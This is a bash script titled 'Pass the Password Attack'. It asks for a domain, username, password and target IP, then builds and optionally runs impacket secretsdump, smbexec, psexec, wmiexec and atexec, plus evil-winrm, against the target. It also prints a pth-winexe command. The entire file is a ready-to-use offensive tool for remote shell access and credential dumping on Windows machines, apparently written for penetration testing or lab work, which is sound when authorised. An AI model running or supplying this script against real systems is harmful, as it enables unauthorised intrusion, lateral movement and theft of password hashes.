#!/bin/bash

# Filename: ptp_password_attack.sh

# Colors
YELLOW='\033[1;33m'
CYAN='\033[1;36m'
RED='\033[1;31m'
NC='\033[0m'

# Banner
echo -e "${CYAN}=============================================="
echo -e "            Pass the Password Attack"
echo -e "==============================================${NC}\n"

# Ask domain
read -p "Enter domain (leave empty if none): " domain

# Ask username
read -p "Enter username: " username

# Ask password (will automatically escape special chars)
read -p "Enter password: " password

# Ask target IP
read -p "Enter target machine IP: " target_ip

# Escape special characters in password for impacket
escaped_password=$(sed 's/[][\!*.^$\/#&@]/\\&/g' <<< "$password")

# Format full target string for impacket
if [[ -n "$domain" ]]; then
    target_full="${domain}/${username}:${escaped_password}@${target_ip}"
    pth_user="${domain}/${username}%${password}"
else
    target_full="${username}:${escaped_password}@${target_ip}"
    pth_user="${username}%${password}"
fi

# Display all generated commands
echo -e "\n${CYAN}Generated Commands:${NC}"

echo -e "${YELLOW}\nImpacket Commands:${NC}"
echo "impacket-secretsdump '${target_full}'"
echo "impacket-smbexec '${target_full}'"
echo "impacket-psexec '${target_full}'"
echo "impacket-wmiexec '${target_full}' cmd.exe"
echo "impacket-atexec '${target_full}'"

echo -e "${YELLOW}\nEvil-WinRM Command:${NC}"
echo "evil-winrm -i '${target_ip}' -u '${username}' -p '${password}'"

echo -e "${YELLOW}\nPTH-Toolkit pth-winexe Command (manual run):${NC}"
echo "pth-winexe --user='${pth_user}' //${target_ip} cmd.exe"
echo -e "${CYAN}(Located in: ~/Desktop/Tool/Active_Directory/pth-toolkit)${NC}"

# Ping check before running
echo -e "\n${YELLOW}Pinging ${target_ip} to check connectivity...${NC}"
if ping -c 1 -W 2 "${target_ip}" > /dev/null; then
    echo -e "${CYAN}Target is reachable.${NC}"
else
    echo -e "${RED}Target is NOT reachable!${NC}"
    read -p "Do you still want to continue? (y/n): " proceed_anyway
    if [[ ! "$proceed_anyway" =~ ^[Yy]$ ]]; then
        echo -e "${YELLOW}Exiting script.${NC}"
        exit 1
    fi
fi

# Ask to run impacket & evil-winrm
read -p $'\nDo you want to RUN all Impacket and Evil-WinRM commands now? (y/n): ' run_now

if [[ "$run_now" =~ ^[Yy]$ ]]; then
    echo -e "${CYAN}\nRunning Impacket & Evil-WinRM commands...${NC}"

    echo -e "${YELLOW}\n[*] Running: impacket-secretsdump${NC}"
    impacket-secretsdump "${target_full}"

    echo -e "${YELLOW}\n[*] Running: impacket-smbexec${NC}"
    impacket-smbexec "${target_full}"

    echo -e "${YELLOW}\n[*] Running: impacket-psexec${NC}"
    impacket-psexec "${target_full}"

    echo -e "${YELLOW}\n[*] Running: impacket-wmiexec${NC}"
    impacket-wmiexec "${target_full}" cmd.exe

    echo -e "${YELLOW}\n[*] Running: impacket-atexec${NC}"
    impacket-atexec "${target_full}"

    echo -e "${YELLOW}\n[*] Running: evil-winrm${NC}"
    evil-winrm -i "${target_ip}" -u "${username}" -p "${password}"

    echo -e "${CYAN}\nAll Impacket & Evil-WinRM commands executed.${NC}"

    echo -e "${YELLOW}\nNote: You can now manually run:${NC}"
    echo "pth-winexe --user='${pth_user}' //${target_ip} cmd.exe"
else
    echo -e "${YELLOW}\nExecution skipped. Commands displayed only.${NC}"
fi

